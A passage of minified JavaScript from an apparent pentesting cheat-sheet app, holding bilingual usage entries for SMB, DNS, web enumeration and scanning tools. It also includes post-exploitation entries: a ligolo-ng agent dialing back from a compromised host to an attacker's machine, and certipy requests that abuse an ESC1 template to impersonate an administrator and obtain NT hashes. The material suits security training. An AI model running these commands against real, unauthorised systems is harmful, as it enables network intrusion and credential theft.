enum4linux-ng -u "jsmith" -p "Password123" 10.10.10.134

TIP: Útil cuando las políticas de seguridad del objetivo han deshabilitado el acceso anónimo o la sesión nula y requieres credenciales para mapear la red interna.
===FIN===

===CASO===
TITULO: Enumerar únicamente usuarios y grupos del dominio de forma rápida
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
enum4linux-ng -U -G <target_ip>

FLAGS:
-U → Ejecuta únicamente el módulo para enumerar cuentas de usuario del sistema local o del dominio.
-G → Ejecuta únicamente el módulo para listar grupos locales y del dominio.

EJEMPLO:
enum4linux-ng -U -G 10.10.10.134

TIP: Ahorra una cantidad significativa de tiempo al evitar el escaneo lento de impresoras, recursos compartidos o políticas de red, enfocándote en la identificación de cuentas.
===FIN===

===CASO===
TITULO: Guardar la enumeración completa del sistema en formato JSON para procesamiento
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
enum4linux-ng -A -oJ <output_json_file> <target_ip>

FLAGS:
-A → Ejecuta de manera secuencial todos los módulos de recopilación disponibles.
-oJ → Exporta los resultados estructurados directamente a un archivo de salida en formato JSON.

EJEMPLO:
enum4linux-ng -A -oJ enum_report 10.10.10.134

TIP: Permite parsear la información estructurada de usuarios, recursos compartidos y SID mediante scripts externos o cargarlos en otras herramientas.
===FIN===`,rawTextEn:`===CASO===
TITULO: Comprehensive automated reconnaissance of Samba and Windows SMB services
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
enum4linux-ng -A <target_ip>

FLAGS:
-A → Run all automated enumeration modules (shares, users, passwords policy, OS scan).

EJEMPLO:
enum4linux-ng -A 10.10.10.134

TIP: It defaults to null session attempts; specify authentication parameters with -u and -p tags if guest access is deactivated.
===FIN===

===CASO===
TITULO: Authenticated Samba and Windows active directory enumeration
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
enum4linux-ng -u "<username>" -p "<password>" <target_ip>

FLAGS:
-u → Defines a valid domain or local username to perform authentication.
-p → Specifies the associated password for the authentication attempt.

EJEMPLO:
enum4linux-ng -u "jsmith" -p "Password123" 10.10.10.134

TIP: Crucial when the target system blocks anonymous guest null sessions and credentials are required to extract directory structure data.
===FIN===

===CASO===
TITULO: Targeted quick enumeration of active users and group memberships
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
enum4linux-ng -U -G <target_ip>

FLAGS:
-U → Directs enum4linux-ng to run only the user enumeration module.
-G → Directs enum4linux-ng to run only the group memberships enumeration module.

EJEMPLO:
enum4linux-ng -U -G 10.10.10.134

TIP: Saves time during initial probing by avoiding slower modules like printers or share mapping, focusing on high-value identity discovery.
===FIN===

===CASO===
TITULO: Export complete system enumeration to JSON format for automated ingestion
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
enum4linux-ng -A -oJ <output_json_file> <target_ip>

FLAGS:
-A → Run all automated enumeration modules covering users, groups, and shares.
-oJ → Formats and writes all collected structural metadata directly to a local JSON file.

EJEMPLO:
enum4linux-ng -A -oJ enum_report 10.10.10.134

TIP: Excellent for automated scripting and integration, allowing other command line utilities to query the discovered Active Directory telemetry.
===FIN===`},smbclient:{name:"smbclient",description:"Cliente de línea de comandos para acceder a recursos compartidos SMB/CIFS (Samba/Windows)",descriptionEn:"Command-line SMB client to access and download files from Windows/Samba network shares",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumerar recursos compartidos (Samba/SMB) de forma anónima (Sesión Nula)
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
smbclient -L //<target_ip>/ -N

FLAGS:
-L → Solicita el listado completo de nombres de recursos compartidos disponibles en el servidor de destino.
-N → Indica al cliente que no solicite contraseña e intente una sesión anónima (Null Session).

EJEMPLO:
smbclient -L //10.10.10.134/ -N

TIP: Es uno de los primeros pasos que debes realizar al encontrarte con el puerto 445 (SMB) abierto en una auditoría de infraestructura.
===FIN===

===CASO===
TITULO: Conectarse interactiva a un recurso compartido específico con credenciales de usuario
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
smbclient //<target_ip>/<share_name> -U <username>

FLAGS:
<share_name> → Nombre del directorio o recurso compartido al que deseas acceder (ej: backups, ADMIN$, C$).
-U → Especifica el nombre del usuario de autenticación local o de dominio.

EJEMPLO:
smbclient //10.10.10.134/backups -U administrator

TIP: Una vez establecida la conexión, puedes navegar por las carpetas usando comandos sencillos como ls, cd, y descargar archivos con el comando "get <filename>".
===FIN===`,rawTextEn:`===CASO===
TITULO: Passive anonymous SMB share enumeration utilizing null sessions
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
smbclient -L //<target_ip>/ -N

FLAGS:
-L → Requests full shared directories and print configurations list.
-N → Disables active prompt password requests (establishing raw Guest/Null requests).

EJEMPLO:
smbclient -L //10.10.10.134/ -N

TIP: Essential verification when assessing exposed 445 network ports.
===FIN===

===CASO===
TITULO: Connect interactively to a target share using valid credentials
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
smbclient //<target_ip>/<share_name> -U <username>

FLAGS:
<share_name> → Name of the target share folder (e.g., backups, ADMIN$, C$).
-U → Specifies the local or domain username to authenticate.

EJEMPLO:
smbclient //10.10.10.134/backups -U administrator

TIP: Once logged in, run commands like ls, cd, and retrieve files using the get command.
===FIN===`},httpx:{name:"httpx",description:"Caja de herramientas HTTP rápida y multipropósito para sondear dominios y recopilar información",descriptionEn:"Fast and multi-purpose HTTP toolkit to probe domains and gather web server information",category:"Web",rawText:`===CASO===
TITULO: Sondear una lista de subdominios para identificar servidores web activos
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
httpx -l <subdomains_file> -silent

FLAGS:
-l → Especifica la lista de hosts o subdominios que se van a escanear.
-silent → Suprime las cabeceras artísticas y muestra únicamente las URL válidas descubiertas.

EJEMPLO:
httpx -l subdomains.txt -silent

TIP: Útil para limpiar listas grandes de subdominios y quedarse solo con los servidores HTTP que responden correctamente.
===FIN===

===CASO===
TITULO: Extraer información técnica detallada (Código de estado, Servidor, Longitud de contenido, Título)
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
httpx -l <subdomains_file> -status-code -title -tech-detect -follow-redirects

FLAGS:
-status-code → Muestra el código de estado HTTP devuelto por el servidor (ej. 200, 302, 403).
-title → Extrae y visualiza el título de la página HTML de forma remota.
-tech-detect → Utiliza firmas de wappalyzer para identificar la tecnología o framework subyacente.
-follow-redirects → Sigue las redirecciones HTTP automáticas para auditar el destino final real.

EJEMPLO:
httpx -l subdomains.txt -status-code -title -tech-detect -follow-redirects

TIP: Combina esto con grep o redirecciones de salida para aislar paneles de administración con códigos de estado 200.
===FIN===`,rawTextEn:`===CASO===
TITULO: Probe a list of subdomains to identify active web servers
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
httpx -l <subdomains_file> -silent

FLAGS:
-l → Specifies the input list of hosts or subdomains to probe.
-silent → Suppresses banner visual art showing only the discovered valid URLs.

EJEMPLO:
httpx -l subdomains.txt -silent

TIP: Highly recommended to clean up massive subdomain lists before launching heavier web scanners.
===FIN===

===CASO===
TITULO: Gather comprehensive web server metadata (Status code, title, technologies)
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
httpx -l <subdomains_file> -status-code -title -tech-detect -follow-redirects

FLAGS:
-status-code → Displays the HTTP response status code.
-title → Extracts and prints the HTML page title.
-tech-detect → Analyzes HTTP headers and cookies to discover the underlying software stack.
-follow-redirects → Instructs httpx to automatically follow redirects to find the real terminal host.

EJEMPLO:
httpx -l subdomains.txt -status-code -title -tech-detect -follow-redirects

TIP: Essential step for mapping wide attack surfaces and highlighting potential entry points.
===FIN===`},masscan:{name:"masscan",description:"Escáner de puertos IP de nivel masivo y rendimiento extremo capaz de transmitir paquetes a velocidades muy altas",descriptionEn:"Extreme performance, massive-scale IP port scanner capable of transmitting packets at high rates",category:"Reconocimiento",rawText:`===CASO===
TITULO: Escaneo ultrarrápido de puertos TCP específicos en una red de gran tamaño
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
masscan -p<ports> <target_subnet> --rate <rate_speed>

FLAGS:
-p → Especifica los puertos individuales o rangos que se van a escanear.
--rate → Limita o establece la cantidad de paquetes transmitidos por segundo (ej: 1000, 10000).

EJEMPLO:
masscan -p80,443,8080 10.10.0.0/16 --rate 1000

TIP: Ten cuidado al subir el rate a más de 1000 pps, ya que puede saturar conexiones hogareñas o levantar alarmas en sistemas IDS.
===FIN===`,rawTextEn:`===CASO===
TITULO: Ultra-fast TCP port scanning across a massive network range
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
masscan -p<ports> <target_subnet> --rate <rate_speed>

FLAGS:
-p → Defines the specific ports or range to test.
--rate → Controls the packet transmission speed limit per second.

EJEMPLO:
masscan -p80,443,8080 10.10.0.0/16 --rate 1000

TIP: Be careful with extremely high rates since they can cause local network congestion or immediately trigger firewall warnings.
===FIN===`},whatweb:{name:"whatweb",description:"Identificador de tecnologías web de última generación que analiza cabeceras, cookies y código HTML para detectar gestores de contenido y plugins",descriptionEn:"Next-generation web technology fingerprinter analyzing headers, cookies, and HTML to identify CMS and platforms",category:"Reconocimiento",rawText:`===CASO===
TITULO: Escaneo básico para identificar firmas y tecnologías en un sitio web
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
whatweb <target_url>

FLAGS:
<target_url> → La URL completa del servidor o dirección IP que se va a escanear.

EJEMPLO:
whatweb http://10.10.10.134

TIP: Te ayuda a identificar rápidamente si el servidor de destino ejecuta WordPress, Drupal, Apache, PHP u otras plataformas conocidas.
===FIN===

===CASO===
TITULO: Escaneo agresivo para forzar la revelación de más detalles del CMS y plugins
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
whatweb -a 3 <target_url>

FLAGS:
-a 3 → Cambia el nivel de agresión a 3 (agresivo), realizando múltiples consultas secundarias de búsqueda de plugins y recursos.

EJEMPLO:
whatweb -a 3 http://10.10.10.134

TIP: Los niveles altos de agresión son ruidosos pero indispensables para enumerar componentes secundarios o versiones de plugins específicas.
===FIN===`,rawTextEn:`===CASO===
TITULO: Basic target fingerprinting to discover CMS and frameworks
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
whatweb <target_url>

FLAGS:
<target_url> → The full URL address of the web server to audit.

EJEMPLO:
whatweb http://10.10.10.134

TIP: Perfect for quick profiling of target sites to immediately see if they are running popular platforms like WordPress or Drupal.
===FIN===

===CASO===
TITULO: Aggressive fingerprinting mode to extract deep version configurations
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
whatweb -a 3 <target_url>

FLAGS:
-a 3 → Set aggression levels to 3 (aggressive), triggering deeper probes and recursive asset queries.

EJEMPLO:
whatweb -a 3 http://10.10.10.134

TIP: High aggression scans are louder and more likely to be logged by firewalls but yield much more detailed version insights.
===FIN===`},katana:{name:"katana",description:"Rastreador y crawler web moderno y de alto rendimiento diseñado para la recolección automática de endpoints y enlaces",descriptionEn:"Modern, highly optimized web crawler and spider designed for automated endpoint and link gathering",category:"Web",rawText:`===CASO===
TITULO: Rastreo estándar de un sitio web para recopilar endpoints de forma rápida
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
katana -u <target_url>

FLAGS:
-u → Define la URL base inicial desde la cual comenzará a rastrear el crawler.

EJEMPLO:
katana -u http://10.10.10.134

TIP: Katana extraerá automáticamente todas las rutas, scripts de JavaScript y formularios estáticos dentro de la URL proporcionada.
===FIN===

===CASO===
TITULO: Rastreo interactivo renderizando JavaScript con un navegador embebido (Modo Headless)
CATEGORIA: Web
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
katana -u <target_url> -headless -system-chrome

FLAGS:
-headless → Inicia una instancia de Chrome sin interfaz para ejecutar scripts de JS interactivos de la página.
-system-chrome → Utiliza el navegador de Chrome instalado en el sistema local en lugar de uno descargado por defecto.

EJEMPLO:
katana -u http://10.10.10.134 -headless -system-chrome

TIP: Imprescindible para aplicaciones web modernas basadas en frameworks de frontend interactivos (ej: React, Vue, Angular) que cargan rutas dinámicamente.
===FIN===`,rawTextEn:`===CASO===
TITULO: Standard web crawler scanning to index structural endpoints and sub-directories
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
katana -u <target_url>

FLAGS:
-u → Sets the initial base URL entry point for crawler spiders.

EJEMPLO:
katana -u http://10.10.10.134

TIP: Highly effective for building a complete site dictionary and indexing JS source scripts.
===FIN===

===CASO===
TITULO: Active crawling with full Javascript execution utilizing a headless browser
CATEGORIA: Web
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
katana -u <target_url> -headless -system-chrome

FLAGS:
-headless → Spawns a headless chrome process to automatically run client-side JS actions.
-system-chrome → Directs katana to use local native chrome binaries.

EJEMPLO:
katana -u http://10.10.10.134 -headless -system-chrome

TIP: Critical when testing modern SPA systems built on React, Vue, or Angular that load page assets asynchronously.
===FIN===`},wafw00f:{name:"wafw00f",description:"Herramienta de detección y huella digital de cortafuegos de aplicaciones web (WAF)",descriptionEn:"Web Application Firewall (WAF) detection and fingerprinting tool",category:"Reconocimiento",rawText:`===CASO===
TITULO: Detección y análisis automático de cortafuegos (WAF) en un sitio web
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
wafw00f <target_url>

FLAGS:
<target_url> → URL o dominio que se va a analizar para verificar la presencia de un cortafuegos activo.

EJEMPLO:
wafw00f http://10.10.10.134

TIP: Te ayuda a identificar de antemano si sistemas como Cloudflare, Imperva, ModSecurity o F5 BIG-IP están protegiendo la web.
===FIN===`,rawTextEn:`===CASO===
TITULO: Analyze a target website to detect active Web Application Firewalls
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
wafw00f <target_url>

FLAGS:
<target_url> → The target URL or domain to inspect for firewalls.

EJEMPLO:
wafw00f http://10.10.10.134

TIP: Useful to check if systems like Cloudflare, Imperva, or ModSecurity are protecting the target prior to running automated scans.
===FIN===`},dnsenum:{name:"dnsenum",description:"Herramienta de subprocesos múltiples para enumerar información DNS de dominios, subdominios e IPs asociadas",descriptionEn:"Multi-threaded tool to gather DNS information, subdomains, and mail server records of a domain",category:"Reconocimiento",rawText:`===CASO===
TITULO: Enumeración DNS completa de un dominio (Registros MX, NS, AXFR e IPs)
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
dnsenum <target_domain>

FLAGS:
<target_domain> → El nombre de dominio que deseas auditar.

EJEMPLO:
dnsenum internal.target.htb

TIP: La herramienta intentará automáticamente realizar transferencias de zona (AXFR) de todos los servidores de nombres encontrados.
===FIN===

===CASO===
TITULO: Fuerza bruta de subdominios utilizando un diccionario específico
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
dnsenum --dnsserver <dns_resolver_ip> -f <dns_wordlist_path> <target_domain>

FLAGS:
--dnsserver → Indica un servidor DNS resolver específico para evitar resoluciones públicas ralentizadas.
-f → Especifica la ruta al diccionario local de subdominios que se usará para realizar fuerza bruta.

EJEMPLO:
dnsenum --dnsserver 1.1.1.1 -f /usr/share/wordlists/subdomains.txt target.htb

TIP: Te permite descubrir hosts no expuestos públicamente apuntando directamente a DNS internos de la infraestructura.
===FIN===`,rawTextEn:`===CASO===
TITULO: Comprehensive DNS enumeration and zone transfer attempts
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
dnsenum <target_domain>

FLAGS:
<target_domain> → The target domain name to query.

EJEMPLO:
dnsenum internal.target.htb

TIP: Attempts zone transfers (AXFR) automatically against every identified nameserver.
===FIN===

===CASO===
TITULO: Subdomain brute-forcing via wordlists with custom DNS resolvers
CATEGORIA: Reconocimiento
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
dnsenum --dnsserver <dns_resolver_ip> -f <dns_wordlist_path> <target_domain>

FLAGS:
--dnsserver → Specifies a custom DNS server IP address to run queries.
-f → Sets the local subdomains dictionary path to use for brute force.

EJEMPLO:
dnsenum --dnsserver 1.1.1.1 -f /usr/share/wordlists/subdomains.txt target.htb

TIP: Helps locate shadow assets or non-public services when querying internal directory DNS maps.
===FIN===`},dirsearch:{name:"dirsearch",description:"Buscador de directorios y archivos web avanzado escrito en Python que utiliza hilos para un descubrimiento rápido de rutas",descriptionEn:"Advanced Python-written web directory and file scanner utilizing multi-threading for quick discoveries",category:"Web",rawText:`===CASO===
TITULO: Búsqueda básica de rutas y directorios web en un servidor objetivo
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
dirsearch -u <target_url> -e <extensions>

FLAGS:
-u → Especifica la URL base del sitio web objetivo para escanear.
-e → Define una lista separada por comas de extensiones de archivos para comprobar (ej: php,html,txt).

EJEMPLO:
dirsearch -u http://10.10.10.134 -e php,html,txt,zip

TIP: Dirsearch utiliza diccionarios optimizados predeterminados incorporados que son perfectos para flujos de trabajo de pentesting estándar.
===FIN===`,rawTextEn:`===CASO===
TITULO: Base web file and directory discovery scanner
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
dirsearch -u <target_url> -e <extensions>

FLAGS:
-u → Defines the base URL address of the target web server.
-e → Sets a comma-separated list of target file extensions to search for.

EJEMPLO:
dirsearch -u http://10.10.10.134 -e php,html,txt,zip

TIP: Built-in wordlists are highly optimized for general pentest engagements and standard admin pathways.
===FIN===`},feroxbuster:{name:"feroxbuster",description:"Herramienta de descubrimiento de contenido web recursivo, rápida y robusta escrita en Rust",descriptionEn:"Extremely fast, recursive web content discovery tool written in Rust",category:"Web",rawText:`===CASO===
TITULO: Escaneo recursivo rápido de directorios web con un diccionario local
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
feroxbuster -u <target_url> -w <wordlist_path>

FLAGS:
-u → Especifica la URL base inicial del servidor web objetivo.
-w → Ruta al diccionario local que se utilizará para realizar las solicitudes HTTP.

EJEMPLO:
feroxbuster -u http://10.10.10.134 -w /usr/share/wordlists/dirb/common.txt

TIP: Feroxbuster realiza escaneos recursivos por defecto; si encuentra un subdirectorio válido, lo añadirá dinámicamente a la cola de escaneo.
===FIN===

===CASO===
TITULO: Desactivar la recursividad y filtrar códigos de estado específicos de los resultados
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
feroxbuster -u <target_url> -w <wordlist_path> -n -C <exclude_status>

FLAGS:
-n → Desactiva el comportamiento recursivo por defecto para que solo escanee el nivel de directorio superior proporcionado.
-C → Filtra y oculta respuestas HTTP basadas en el código de estado indicado (ej: 404, 500).

EJEMPLO:
feroxbuster -u http://10.10.10.134 -w /usr/share/wordlists/dirb/common.txt -n -C 404,500

TIP: Desactivar la recursividad reduce drásticamente el tiempo de ejecución y la cantidad total de solicitudes generadas.
===FIN===`,rawTextEn:`===CASO===
TITULO: Fast recursive directory scanning using local wordlists
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
feroxbuster -u <target_url> -w <wordlist_path>

FLAGS:
-u → Configures the initial target web host URL.
-w → Sets the dictionary path to construct web queries.

EJEMPLO:
feroxbuster -u http://10.10.10.134 -w /usr/share/wordlists/dirb/common.txt

TIP: It recurses directories dynamically; newly discovered folders are automatically queued into active workers.
===FIN===

===CASO===
TITULO: Scan non-recursively excluding custom HTTP response status codes
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
feroxbuster -u <target_url> -w <wordlist_path> -n -C <exclude_status>

FLAGS:
-n → Disables recursive scanning, analyzing only the primary target path.
-C → Excludes specific HTTP response status codes from output logs.

EJEMPLO:
feroxbuster -u http://10.10.10.134 -w /usr/share/wordlists/dirb/common.txt -n -C 404,500

TIP: Restricting recursion limits total web request counts, saving bandwith and time.
===FIN===`},"ligolo-ng":{name:"ligolo-ng",description:"Herramienta de tunelización y pivoteo de red avanzada y de alto rendimiento que utiliza interfaces TUN/TAP para un enrutamiento completo",descriptionEn:"High-performance, advanced network tunneling and pivoting tool utilizing TUN/TAP interfaces for transparent routing",category:"Post-explotación",rawText:`===CASO===
TITULO: Iniciar el servidor receptor de Ligolo (Proxy) en la máquina de ataque
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
./proxy -laddr 0.0.0.0:11601 -selfcert

FLAGS:
-laddr → Define el puerto local de escucha del servidor de pivoteo.
-selfcert → Genera y firma automáticamente certificados TLS autocertificados sobre la marcha para asegurar la transmisión.

EJEMPLO:
./proxy -laddr 0.0.0.0:11601 -selfcert

TIP: Este proceso se ejecuta en tu máquina atacante para esperar las conexiones entrantes del agente alojado en la red víctima.
===FIN===

===CASO===
TITULO: Ejecutar el agente de Ligolo en el host objetivo para conectarse al proxy del atacante
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
./agent -connect <attacker_ip>:11601 -ignore-cert

FLAGS:
-connect → Especifica la dirección IP y puerto donde tu servidor proxy de Ligolo está a la escucha.
-ignore-cert → Instruye al agente a confiar en el certificado TLS autofirmado generado por tu proxy.

EJEMPLO:
./agent -connect 10.10.14.3:11601 -ignore-cert

TIP: Una vez conectado, configura una interfaz TUN en tu máquina atacante y añade rutas con "ip route" para interactuar de forma transparente con toda la red interna de la víctima.
===FIN===`,rawTextEn:`===CASO===
TITULO: Launch the Ligolo relay server on your attacking machine
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
./proxy -laddr 0.0.0.0:11601 -selfcert

FLAGS:
-laddr → Binds the pivoting listener to a local port address.
-selfcert → Dynamically crafts and signs TLS credentials to secure transport payloads.

EJEMPLO:
./proxy -laddr 0.0.0.0:11601 -selfcert

TIP: Run this background process on your attacking VPS or box before launching agent implants on targets.
===FIN===

===CASO===
TITULO: Run the Ligolo agent implant on a compromised host to dial back
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
./agent -connect <attacker_ip>:11601 -ignore-cert

FLAGS:
-connect → Connects the agent directly back to your active attacking listener.
-ignore-cert → Bypass security validations on self-signed TLS credentials generated by your server.

EJEMPLO:
./agent -connect 10.10.14.3:11601 -ignore-cert

TIP: After establishing sessions, manage a local virtual TUN interface to easily route standard scanner tools inside target subnets.
===FIN===`},certipy:{name:"certipy",description:"Caja de herramientas de última generación para auditar y abusar de Servicios de Certificados de Active Directory (AD CS)",descriptionEn:"Next-generation tool suite for auditing and abusing Active Directory Certificate Services (AD CS)",category:"Post-explotación",rawText:`===CASO===
TITULO: Buscar y enumerar vulnerabilidades en plantillas de certificados AD CS (Sesión no autenticada/autenticada)
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
certipy find -u <username>@<target_domain> -p <password> -target <domain_controller_ip> -vulnerable

FLAGS:
find → Indica a certipy que ejecute el módulo de enumeración de AD CS.
-vulnerable → Filtra la lista mostrando únicamente aquellas plantillas que posean configuraciones explotables conocidas.

EJEMPLO:
certipy find -u "jsmith@corp.local" -p "Password123" -target 10.10.10.134 -vulnerable

TIP: La salida generará archivos de texto (.txt) y JSON con detalles estructurados de ataques lógicos (ej: ESC1, ESC2, ESC3, etc.).
===FIN===

===CASO===
TITULO: Solicitar un nuevo certificado basado en una plantilla vulnerable para suplantar usuarios (ej. ESC1)
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
certipy req -u <username>@<target_domain> -p <password> -target <ca_server_ip> -ca <ca_name> -template <template_name> -upn <target_user_upn>

FLAGS:
req → Módulo de solicitud de certificados.
-ca → Nombre específico de la Entidad de Certificación del Active Directory.
-template → Plantilla vulnerable identificada (ej: WebServer, User).
-upn → Nombre de la cuenta que deseas suplantar (ej: administrator@corp.local) si la plantilla permite especificar nombres alternativos de sujeto (SAN).

EJEMPLO:
certipy req -u "jsmith@corp.local" -p "Password123" -target 10.10.10.134 -ca "CORP-CA" -template "ESC1-Template" -upn "administrator@corp.local"

TIP: Si la solicitud tiene éxito, se descargará un archivo .pfx. Luego puedes usar "certipy auth" para intercambiar este certificado por el hash NT de la cuenta suplantada.
===FIN===`,rawTextEn:`===CASO===
TITULO: Scan Active Directory Certificate Services (AD CS) for misconfigurations
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
certipy find -u <username>@<target_domain> -p <password> -target <domain_controller_ip> -vulnerable

FLAGS:
find → Launches the AD CS discovery and enumeration engine.
-vulnerable → Restricts generated logs to vulnerable certificate templates only.

EJEMPLO:
certipy find -u "jsmith@corp.local" -p "Password123" -target 10.10.10.134 -vulnerable

TIP: Output files include detailed text summaries and structured JSON ready to be mapped in security layouts.
===FIN===

===CASO===
TITULO: Request a forged certificate targeting vulnerable templates (e.g. ESC1 SAN abuse)
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
certipy req -u <username>@<target_domain> -p <password> -target <ca_server_ip> -ca <ca_name> -template <template_name> -upn <target_user_upn>

FLAGS:
req → Invokes the certificate request service.
-ca → Direct Active Directory Certification Authority name.
-template → Exploitable blueprint template name.
-upn → Target user account to spoof (e.g. administrator@corp.local).

EJEMPLO:
certipy req -u "jsmith@corp.local" -p "Password123" -target 10.10.10.134 -ca "CORP-CA" -template "ESC1-Template" -upn "administrator@corp.local"

TIP: Successful requests produce an output .pfx file. Use "certipy auth" next to trade this certificate for the spoofed account's NT hash.
===FIN===`}};function ts(T){const F=[],M=T.split("===CASO===").slice(1);for(const p of M){const x=p.split("===FIN===");if(x.length===0)continue;const B=x[0].trim();if(!B)continue;const W=B.split(`
`);let de="",D="Reconocimiento",O="básico",w="común",I="",fe=[],Le="",Oe="",me="metadata";for(const Ke of W){const Y=Ke.trim();if(Y){if(Y.startsWith("TITULO:")){de=Y.substring(7).trim();continue}if(Y.startsWith("CATEGORIA:")){D=Y.substring(10).trim();continue}if(Y.startsWith("DIFICULTAD:")){O=Y.substring(11).trim();continue}if(Y.startsWith("FRECUENCIA:")){w=Y.substring(11).trim();continue}if(Y.startsWith("COMANDO:")){me="comando";continue}if(Y.startsWith("FLAGS:")){me="flags";continue}if(Y.startsWith("EJEMPLO:")){me="ejemplo";continue}if(Y.startsWith("TIP:")){Oe=Y.substring(4).trim(),me="tip";continue}if(me==="comando")I=I?I+`
`+Y:Y;else if(me==="flags"){if(Y.includes("→")){const $e=Y.split("→");fe.push({flag:$e[0].trim(),descripcion:$e.slice(1).join("→").trim()})}}else me==="ejemplo"?Le=Le?Le+`
`+Y:Y:me==="tip"&&(Oe=Oe?Oe+" "+Y:Y)}}F.push({titulo:de||"Comando sin título",categoria:D||"Reconocimiento",dificultad:O||"básico",frecuencia:w||"común",comando:I||"",flags:fe,ejemplo:Le||"",tip:Oe||"Sin consejos de OPSEC registrados."})}return F}function Gf(T){return T.map(F=>`===CASO===
TITULO: ${F.titulo}
CATEGORIA: ${F.categoria}
DIFICULTAD: ${F.dificultad}
FRECUENCIA: ${F.frecuencia}

COMANDO:
${F.comando}

FLAGS:
${F.flags.map(M=>`${M.flag} → ${M.descripcion}`).join(`
`)}

EJEMPLO: ${F.ejemplo}

TIP: ${F.tip}
===FIN===`).join(`

`)}function Vh({commandTemplate:T,replacements:F}){const M=T.split(/(<[^>]+>)/g);return u.jsx("span",{className:"font-mono tracking-wide whitespace-pre-wrap",children:M.map((p,x)=>{if(p.startsWith("<")&&p.endsWith(">")){const W=p.slice(1,-1),de=F[W]!==void 0&&F[W].trim()!=="",D=de?F[W]:p;return u.jsx("span",{className:`font-semibold px-1 rounded transition-all duration-205 border inline-block ${de?"bg-emerald-500/10 text-emerald-300 border-emerald-500/35 shadow-[0_0_6px_rgba(16,185,129,0.2)]":"bg-cyan-500/10 text-cyan-450 border-cyan-500/20"}`,children:D},x)}const B=p.split(/(\s+)/);return u.jsx(dh.Fragment,{children:B.map((W,de)=>W.startsWith("-")?u.jsx("span",{className:"text-amber-400 font-medium whitespace-pre",children:W},de):["nmap","gobuster","ffuf","hydra","hashcat","subfinder","john","mimikatz","chisel","sqlmap","enum4linux-ng","responder","msfvenom","crackmapexec","netcat","nc","sudo","python","python3","bash","cat","grep","curl","wget","impacket-psexec","impacket-secretsdump","impacket-wmiexec","httpx","masscan","whatweb","katana","wafw00f","dnsenum","dirsearch","feroxbuster","ligolo-ng","agent","proxy","certipy"].includes(W.toLowerCase())?u.jsx("span",{className:"text-cyan-400 font-extrabold whitespace-pre",children:W},de):u.jsx("span",{className:"text-emerald-50/90 whitespace-pre",children:W},de))},x)})})}const 